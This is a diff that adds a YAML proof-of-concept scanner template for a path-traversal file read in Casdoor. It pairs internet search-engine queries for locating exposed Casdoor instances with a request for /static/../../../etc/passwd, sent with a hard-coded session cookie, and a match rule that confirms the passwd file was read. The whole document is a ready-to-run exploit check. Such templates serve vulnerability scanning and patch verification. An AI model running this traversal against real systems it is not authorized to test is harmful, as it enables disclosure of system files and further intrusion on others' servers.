@@ -1,0 +1,37 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Casdoor"
+    hunter-query: web.title=="Built-in Organization"||web.title=="Casdoor"
+    quake-query: app:"casdoor"  
+    zoomeye-query: title:"Casdoor" title:"Built-in Organization"
+    threatbook-query: title=Casdoor
+    cve: 
+    cnvd: 
+    
+name: poc-yaml-casdoor-static-readfile
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /static/../../../../../../../../../../../etc/passwd
+      follow_redirects: false
+      headers:
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        DNT: 1
+        Cookie: casdoor_session_id=0a2f2dbe922f59ebd72dab8548430946
+      body: |
+    expression: >-
+      response.status == 200 && "root:[x*]:0:0:".matches(response.body_string)
+
+expression: r0() 
+
